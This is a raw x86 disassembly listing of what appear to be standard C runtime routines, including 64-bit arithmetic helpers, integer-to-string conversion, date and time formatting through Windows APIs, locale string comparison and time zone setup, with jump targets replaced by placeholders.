dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_10083930
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_1008394f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
call sub_1004b131
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_1005b670
push 0x16
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_1005b670
push 0x22
jmp r-xdata
pop edi
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
call sub_1004b131
mov eax esi
jmp r-xdata
mov edi ecx
xor ebx ebx
inc ebx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov [ ecx ] dl
inc ecx
inc ebx
test eax eax
je r-xdata
mov [ ecx ] 0x0
dec ecx
mov [ esi ] 0x0
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_10083a09
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
xor ecx ecx
push esi
cmp edi ecx
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
call sub_1005b670
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] ecx
mov [ edi ] cl
setne al
inc eax
cmp [ ebp + 0x10 ] eax
ja r-xdata
pop esi
leave
retn 0x14
mov eax [ ebp + 0x14 ]
add eax 0xfffffffe
cmp eax 0x22
ja r-xdata
call sub_1005b670
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov esi edi
cmp [ ebp + 0x18 ] ecx
je r-xdata
pop esi
mov [ eax ] esi
mov [ ebp + 0x18 ] esi
mov [ ebp + 0xc ] ecx
neg ebx
adc eax ecx
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add cl 0x30
add cl 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
test ebx ebx
je r-xdata
mov [ esi ] cl
mov ecx [ ebp - 0x4 ]
inc esi
inc ecx
mov [ ebp - 0x4 ] ecx
test eax eax
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push eax
push ebx
call sub_10082370
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov eax edx
cmp ecx 0x9
jbe r-xdata
mov ecx [ ebp - 0x4 ]
pop ebx
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ esi ] 0x0
dec esi
mov [ edi ] 0x0
call sub_1005b670
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
mov [ ebp + 0x18 ] eax
cmp eax esi
jb r-xdata
xor eax eax
call sub_1004b131
mov eax esi
jmp r-xdata
sub_10083af5
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_10083b83
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_10083c23
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_1000c927
push rw-data
call sub_10006dac
and [ rw-data ] 0x0
pop ecx
lea ecx [ ebp - 0x4 ]
call sub_10003c9c
leave
retn
sub_10083c4f
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0xa
push 0x1f
lea eax [ ebp - 0x23 ]
push eax
push 0x0
push [ ebp + 0x8 ]
mov [ ebp - 0x24 ] 0x2e
call sub_10048e9e
lea eax [ ebp - 0x24 ]
push eax
push 0x0
call sub_1005ff33
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0x1c
call sub_10032529
leave
retn
sub_10083c93
push ebx
push esi
push edi
mov ebx rw-data
add ebx 0x4
cmp ebx rw-data
jl r-xdata
push [ esi + 0x8 ]
mov edi [ esi ]
call sub_1003744b
push esi
call sub_1001b2d2
pop ecx
pop ecx
mov esi edi
test edi edi
jne r-xdata
push 0x0
push ebx
call [ InterlockedExchange@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_10083cea
cmp [ eax ] 0x0
push esi
mov esi edx
je r-xdata
pop esi
retn
push edi
pop edi
mov edi [ ecx ]
mov [ edi ] dl
inc [ ecx ]
inc esi
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
mov dl [ esi ]
test dl dl
je r-xdata
sub_10083d0a
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0x8 ] edx
je r-xdata
cmp esi [ ecx ]
jae r-xdata
cmp [ ecx ] 0x1
mov esi [ edi ]
jbe r-xdata
mov [ ecx ] edx
dec esi
lea edx [ esi + 0x1 ]
test edx edx
je r-xdata
mov eax [ edi ]
mov [ edi ] esi
dec esi
push 0xa
cdq
pop ebx
idiv ebx
add dl 0x30
mov [ esi ] dl
inc esi
dec [ ecx ]
mov edx [ ecx ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
add [ edi ] eax
sub [ ecx ] eax
jmp r-xdata
push 0xa
cdq
pop ebx
idiv ebx
mov ebx [ edi ]
add dl 0x30
inc [ ebp - 0x4 ]
mov [ esi + ebx ] dl
dec esi
cmp esi 0xffffffff
jne r-xdata
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
cmp eax esi
jb r-xdata
jmp r-xdata
cmp edx 0x1
ja r-xdata
pop esi
pop ebx
leave
retn
sub_10083d85
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
movsx eax al
push esi
mov esi [ ebp + 0xc ]
push edi
mov ebx ecx
mov edi edx
cmp eax 0x59
jg r-xdata
cmp eax 0x6d
jg r-xdata
je r-xdata
sub eax 0x70
je r-xdata
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0xfffff894
jl r-xdata
cmp eax 0x49
jg r-xdata
mov esi [ esi + 0x8 ]
test esi esi
js r-xdata
sub eax 0x7
je r-xdata
mov esi [ esi + 0x10 ]
test esi esi
js r-xdata
sub eax 0x5a
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp eax 0x1fa3
jg r-xdata
sub eax 0x4d
je r-xdata
je r-xdata
cmp esi 0x17
jg r-xdata
mov eax [ esi + 0x18 ]
test eax eax
js r-xdata
dec eax
je r-xdata
cmp esi 0xb
jg r-xdata
call sub_10014247
call sub_1005df1e
mov edx eax
xor eax eax
cmp [ esi + 0x20 ] eax
setne al
mov [ ebp - 0x4 ] eax
mov eax ebx
mov ebx [ ebp - 0x4 ]
mov edx [ edx + ebx * 4 ]
jmp r-xdata
sub eax 0x7
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cdq
push 0x64
pop ecx
idiv ecx
push [ ebp + 0x14 ]
mov ecx ebx
push 0x4
add eax 0x13
imul eax eax 0x64
add eax edx
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
js r-xdata
push 0x6
pop ecx
sub eax ecx
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
js r-xdata
sub eax 0x4
je r-xdata
mov edx [ ebp + 0x10 ]
cmp esi 0xb
jg r-xdata
cmp eax 0x6
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
push [ ebp + 0x10 ]
push ebx
push edi
push esi
je r-xdata
dec eax
je r-xdata
lea eax [ esi + 0x1 ]
jmp r-xdata
mov ecx edi
call sub_10083cea
mov esi [ esi + 0x18 ]
test esi esi
js r-xdata
dec eax
je r-xdata
pop edx
cmp eax 0x3b
jmp r-xdata
mov eax [ esi ]
test eax eax
js r-xdata
dec eax
dec eax
je r-xdata
cmp esi 0x17
jg r-xdata
xor eax eax
inc eax
sub eax 0x9
je r-xdata
mov edx [ edx + 0x9c ]
mov edx [ edx + 0x98 ]
jmp r-xdata
push [ ebp + 0x14 ]
xor edx edx
inc edx
jmp r-xdata
push 0x0
jmp r-xdata
push 0x1
jmp r-xdata
mov eax [ esi + 0x14 ]
test eax eax
js r-xdata
dec eax
jne r-xdata
push [ ebp + 0x14 ]
cmp esi 0x6
jle r-xdata
mov esi [ esi + 0x10 ]
test esi esi
js r-xdata
dec eax
je r-xdata
jg r-xdata
cmp eax 0x3b
jg r-xdata
mov eax [ esi + 0x18 ]
test eax eax
js r-xdata
dec eax
dec eax
je r-xdata
mov eax esi
cdq
push 0xc
pop ecx
idiv ecx
mov eax edx
test eax eax
jne r-xdata
sub eax 0x18
je r-xdata
mov eax ebx
call sub_10083d0a
pop ecx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1008413d
add esp 0x18
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
cdq
push 0x64
pop ecx
idiv ecx
mov ecx ebx
mov eax edx
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 ]
jmp r-xdata
cmp esi 0xb
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
push [ ebp + 0x10 ]
push ebx
push edi
push esi
je r-xdata
dec eax
je r-xdata
jmp r-xdata
jmp r-xdata
cmp eax ecx
jg r-xdata
mov eax [ esi + 0x18 ]
test eax eax
js r-xdata
dec eax
jne r-xdata
mov ecx ebx
jmp r-xdata
push ecx
pop eax
mov eax [ edi ]
mov [ eax ] 0x25
inc [ edi ]
dec [ ebx ]
jmp r-xdata
sub eax 0x1c
je r-xdata
jmp r-xdata
push 0x2
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x38 ]
jmp r-xdata
push 0x0
jmp r-xdata
push 0x1
mov esi [ esi + 0xc ]
cmp esi 0x1
jl r-xdata
sub eax 0x6
jne r-xdata
mov ecx eax
cmp eax ecx
jg r-xdata
jmp r-xdata
mov esi [ esi + 0x18 ]
test esi esi
js r-xdata
dec eax
je r-xdata
push [ ebp + 0x8 ]
call sub_1008413d
add esp 0x18
test eax eax
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp esi 0x1f
jg r-xdata
mov esi [ esi + 0x1c ]
test esi esi
js r-xdata
cmp eax 0x16d
jg r-xdata
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push ebx
push edi
push esi
push 0x2
cmp esi 0x6
jg r-xdata
mov esi [ esi + 0x10 ]
test esi esi
js r-xdata
sub eax 0x6
jne r-xdata
mov eax [ edi ]
mov [ eax ] 0x20
inc [ edi ]
dec [ ebx ]
mov eax esi
cmp esi 0x16d
jg r-xdata
cmp eax ecx
jge r-xdata
mov eax [ esi + 0x1c ]
test eax eax
js r-xdata
lea ecx [ eax - 0x1 ]
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x1c ]
jmp r-xdata
cmp esi 0xb
jg r-xdata
mov eax [ esi + 0x8 ]
test eax eax
js r-xdata
push [ ebp + 0x14 ]
lea eax [ esi + 0x1 ]
push 0x3
jmp r-xdata
push 0x7
cdq
pop esi
idiv esi
cmp edx ecx
jl r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov edx [ edx + esi * 4 + 0x68 ]
jmp r-xdata
cmp eax 0x17
inc eax
jmp r-xdata
sub_1008413d
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
sub ecx 0x0
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x1c ]
push edi
mov [ ebp - 0x24 ] eax
je r-xdata
mov edi [ eax + 0xa0 ]
dec ecx
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebp + 0xc ] 0x2
mov eax [ GetDateFormatA@IAT ]
jne r-xdata
mov edi [ eax + 0xa4 ]
jmp r-xdata
mov edi [ eax + 0xa8 ]
jmp r-xdata
xor edx edx
cmp [ ebx ] edx
je r-xdata
jmp r-xdata
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x28 ]
mov ecx 0x76c
add cx [ eax + 0x14 ]
mov [ ebp - 0x14 ] cx
mov cx [ eax + 0x10 ]
inc cx
mov [ ebp - 0x12 ] cx
mov cx [ eax + 0xc ]
mov [ ebp - 0xe ] cx
mov cx [ eax + 0x8 ]
mov [ ebp - 0xc ] cx
mov cx [ eax + 0x4 ]
mov ax [ eax ]
mov [ ebp - 0x8 ] ax
xor eax eax
push eax
push eax
push edi
mov [ ebp - 0xa ] cx
lea ecx [ ebp - 0x14 ]
push ecx
push eax
mov [ ebp - 0x6 ] ax
mov eax [ ebp - 0x24 ]
push [ eax + 0xac ]
call [ ebp - 0x2c ]
mov [ ebp - 0x30 ] eax
test eax eax
je r-xdata
mov eax [ GetTimeFormatA@IAT ]
cmp [ eax + 0xb0 ] 0x1
je r-xdata
xor eax eax
inc eax
mov [ ebp - 0x18 ] edx
mov ecx edi
add eax 0x8
cmp eax 0x400
jg r-xdata
inc ecx
inc edx
cmp [ ecx ] al
je r-xdata
mov [ ebp - 0x1c ] ecx
movsx ecx al
cmp ecx 0x64
jg r-xdata
push eax
call sub_10021090
pop ecx
test eax eax
je r-xdata
call sub_10082fa0
mov eax esp
test eax eax
je r-xdata
mov eax ecx
sub eax 0x68
je r-xdata
je r-xdata
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov eax edx
dec eax
je r-xdata
sub eax 0x5
je r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x27
je r-xdata
push [ ebp - 0x30 ]
mov [ ebp - 0x1c ] eax
push eax
push edi
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x24 ]
push 0x0
push [ eax + 0xac ]
call [ ebp - 0x2c ]
dec eax
test eax eax
jle r-xdata
add eax 0x8
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
sub eax 0x6
je r-xdata
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
add edi edx
test dl 0x1
je r-xdata
cmp ecx 0x41
je r-xdata
push [ ebp - 0x18 ]
call sub_1002255a
pop ecx
mov edi [ ebp - 0x1c ]
xor eax eax
jmp r-xdata
mov edi [ ebp - 0x1c ]
jmp r-xdata
mov al 0x49
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
dec eax
je r-xdata
push [ ebp - 0x18 ]
mov ecx ebx
push [ ebp - 0x24 ]
mov edx esi
push [ ebp - 0x28 ]
push [ ebp - 0x20 ]
call sub_10083d85
add esp 0x10
test eax eax
je r-xdata
mov al 0x64
jmp r-xdata
dec eax
je r-xdata
mov al [ edi ]
test al al
je r-xdata
push r--data
push edi
call sub_10017bd1
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp ecx 0x48
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
dec eax
test eax eax
jg r-xdata
lea esp [ ebp - 0x3c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
leave
retn
push [ ebp - 0x20 ]
push ecx
call sub_1001b8e5
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x4d
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x8 ] 0xb
mov eax [ ebp - 0x24 ]
jg r-xdata
sub eax 0x5
jne r-xdata
mov al 0x61
jmp r-xdata
dec eax
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
push r--data
push edi
call sub_10017bd1
pop ecx
pop ecx
test eax eax
jne r-xdata
add edi 0x5
jmp r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x4d
je r-xdata
cmp [ ebx ] 0x0
jbe r-xdata
mov cl [ edi ]
mov eax [ esi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x1
jbe r-xdata
mov al 0x53
jmp r-xdata
jmp r-xdata
mov edi [ eax + 0x9c ]
mov edi [ eax + 0x98 ]
jmp r-xdata
lea eax [ edx - 0x1 ]
dec eax
je r-xdata
mov al 0x41
jmp r-xdata
cmp al 0x27
je r-xdata
mov al 0x70
jmp r-xdata
add edi 0x3
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov eax edx
dec eax
je r-xdata
cmp ecx 0x61
je r-xdata
cmp [ edi + 0x1 ] 0x0
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebx ] 0x0
jbe r-xdata
cmp edx 0x1
jne r-xdata
mov al 0x79
jmp r-xdata
dec eax
dec eax
jne r-xdata
inc edi
jmp r-xdata
push [ ebp - 0x20 ]
movsx eax al
push eax
call sub_1001b8e5
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x48
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
dec eax
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x0
jbe r-xdata
jmp r-xdata
movsx eax [ edi ]
push [ ebp - 0x20 ]
push eax
call sub_1001b8e5
pop ecx
pop ecx
test eax eax
je r-xdata
mov al 0x59
jmp r-xdata
mov eax [ esi ]
mov cl [ edi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
mov al [ edi ]
test al al
jne r-xdata
cmp [ ebx ] 0x1
jbe r-xdata
mov al 0x6d
jmp r-xdata
dec eax
je r-xdata
push [ ebp - 0x20 ]
movsx eax al
push eax
call sub_1001b8e5
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi ]
mov cl [ edi ]
mov [ eax ] cl
inc [ esi ]
dec [ ebx ]
jmp r-xdata
cmp [ ebx ] 0x1
jbe r-xdata
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
je r-xdata
mov al 0x62
jmp r-xdata
dec eax
jne r-xdata
mov cl [ edi ]
mov eax [ esi ]
mov [ eax ] cl
inc [ esi ]
inc edi
dec [ ebx ]
cmp [ ebx ] 0x1
jbe r-xdata
cmp [ edi + 0x1 ] 0x0
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
mov al 0x42
jmp r-xdata
cmp [ edi + 0x1 ] 0x0
je r-xdata
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
mov dl [ edi ]
mov ecx [ esi ]
mov [ ecx ] dl
inc [ esi ]
inc edi
dec [ ebx ]
sub_100845a0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_10084608
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx ecx
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
test edi edi
jle r-xdata
cmp edi 0xffffffff
jge r-xdata
mov ecx edi
mov esi [ ebp + 0x18 ]
test esi esi
jle r-xdata
xor eax eax
jmp r-xdata
or eax 0xffffffff
sub eax ecx
add edi eax
mov [ ebp + 0x14 ] edi
inc eax
test ecx ecx
jne r-xdata
cmp esi 0xffffffff
jl r-xdata
mov ecx esi
mov eax edx
lea esp [ ebp - 0x38 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
leave
retn
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
and [ ebp - 0x28 ] 0x0
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
or eax 0xffffffff
sub eax ecx
add esi eax
mov [ ebp + 0x18 ] esi
jmp r-xdata
inc eax
test ecx ecx
jne r-xdata
test edi edi
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
cmp edi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
inc ebx
cmp esi ebx
jle r-xdata
push 0x2
mov esi [ MultiByteToWideChar@IAT ]
push 0x0
push 0x0
push edi
push [ ebp - 0x24 ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
je r-xdata
cmp edi ebx
jle r-xdata
mov eax ebx
jmp r-xdata
mov edi 0x400
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0x1c ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
push 0x3
jmp r-xdata
and [ ebp - 0x1c ] 0x0
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
test edi edi
jle r-xdata
pop eax
jmp r-xdata
push ebx
push [ ebp - 0x1c ]
push [ ebp + 0x14 ]
push [ ebp - 0x24 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
test esi esi
jle r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
push [ ebp - 0x1c ]
call sub_1002255a
mov eax [ ebp - 0x28 ]
pop ecx
push 0x0
push 0x0
push [ ebp + 0x18 ]
push [ ebp - 0x20 ]
push 0x9
push [ ebp + 0x1c ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push eax
call sub_10021090
pop ecx
test eax eax
je r-xdata
call sub_10082fa0
mov eax esp
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x2
jb r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
jle r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
add eax 0x8
mov dl [ eax + 0x1 ]
test dl dl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp - 0x20 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ ebx + ebx + 0x8 ]
cmp eax edi
ja r-xdata
mov ecx [ ebp - 0x20 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
push edi
call sub_1002255a
pop ecx
push ebx
push edi
push [ ebp - 0x2c ]
push [ ebp - 0x1c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
mov [ ebp - 0x28 ] eax
push eax
call sub_10021090
pop ecx
test eax eax
je r-xdata
call sub_10082fa0
mov eax esp
test eax eax
je r-xdata
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
jmp r-xdata
test edi edi
je r-xdata
add eax 0x8
sub_10084876
push 0x2c
push r--data
call sub_1007fad0
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x20 ] ebx
push 0x7
call sub_1002f3c9
pop ecx
mov [ ebp - 0x4 ] ebx
call sub_1005df1e
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_100618b9
pop ecx
cmp eax ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1005aa2b
lea eax [ ebp - 0x24 ]
push eax
call sub_10028cb6
pop ecx
cmp eax ebx
jne r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax edi
je r-xdata
push eax
call sub_1001b2d2
pop ecx
mov [ rw-data ] ebx
lea eax [ ebp - 0x28 ]
push eax
call sub_1006192c
pop ecx
cmp eax ebx
jne r-xdata
mov [ ebp - 0x2c ] 0x1
xor ecx ecx
inc ecx
mov [ rw-data ] ecx
mov eax [ rw-data ]
imul eax eax 0x3c
mov [ ebp - 0x1c ] eax
cmp [ rw-data ] bx
je r-xdata
call sub_1002f5d0
mov [ ebp - 0x34 ] eax
mov [ rw-data ] ebx
or edi 0xffffffff
mov [ rw-data ] edi
mov [ rw-data ] edi
push r--data
call sub_100211ee
pop ecx
mov esi eax
mov [ ebp - 0x3c ] esi
cmp esi ebx
je r-xdata
call sub_1007fb15
retn
push 0x3
push esi
push 0x40
mov edi [ ebp - 0x20 ]
push [ edi ]
call sub_10049cc0
add esp 0x10
test eax eax
jne r-xdata
cmp [ rw-data ] bx
je r-xdata
mov edx [ rw-data ]
imul edx edx 0x3c
add eax edx
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ esi ] bl
je r-xdata
add esi 0x3
cmp [ esi ] 0x2d
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push esi
call sub_1003f2b0
pop ecx
imul eax eax 0xe10
mov [ ebp - 0x1c ] eax
